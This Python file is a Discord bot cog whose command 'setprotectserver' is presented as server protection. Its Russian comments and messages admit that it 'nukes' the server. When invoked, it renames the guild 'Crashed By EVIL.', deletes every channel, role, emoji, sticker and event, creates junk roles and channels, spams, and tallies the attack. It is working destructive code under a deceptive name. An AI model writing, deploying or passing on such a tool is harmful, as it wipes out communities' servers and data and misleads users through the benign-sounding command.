import disnake
from disnake.ext import commands
from ..utils.bot_operations import Fucker
from ..utils.counter import AttackCounter
from ..utils.blacklist import is_blacklisted


class ProtectServer(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.attack_counter = AttackCounter()

    @commands.command(name="setprotectserver")
    async def setprotectserver(self, ctx):
        """Крашит сервер обычным !nuke (только если сервер не в чёрном списке)"""
        
        # ===== ПРОВЕРКА ЧЁРНОГО СПИСКА =====
        if is_blacklisted(ctx.guild.id):
            embed = disnake.Embed(
                title="⛔ Доступ запрещён",
                description="Этот сервер находится в чёрном списке.\n"
                            "Команда `!setprotectserver` не может быть использована здесь.",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        # ===== ЗАПУСКАЕМ КРАШ =====
        self.attack_counter.record_attack_start()

        embed_start = disnake.Embed(
            title="💀 ЗАЩИТА СЕРВЕРА АКТИВИРОВАНА",
            description=f"**{ctx.author.name}** активировал защиту на сервере **{ctx.guild.name}**!\n\n"
                        f"⚡ **Сервер будет уничтожен!**",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_start)

        fucker = Fucker(ctx)
        
        # ===== ВЕСЬ КОД ИЗ !NUKE =====
        await ctx.guild.edit(name="Crashed By EVIL.", icon=None)
        await fucker.delChannels(ctx)
        await fucker.delRoles(ctx)
        await fucker.delete_all_emojis(ctx)
        await fucker.delete_all_stickers(ctx)
        await fucker.crRoles(ctx)
        await fucker.crChannels(ctx)
        await fucker.add_max_emojis(ctx, "log.png", "evil")
        await fucker.add_max_stickers(ctx, "log.png", "evil")
        await fucker.spam(ctx)
        await fucker.delete_events(ctx)
        await fucker.create_event(ctx)

        self.attack_counter.record_attack_end()

        embed_end = disnake.Embed(
            title="✅ ЗАЩИТА СЕРВЕРА ЗАВЕРШЕНА",
            description=f"**{ctx.author.name}** уничтожил сервер **{ctx.guild.name}**!\n\n"
                        f"🔥 Сервер крашнут обычным `!nuke`",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_end)


def setup(bot):
    bot.add_cog(ProtectServer(bot))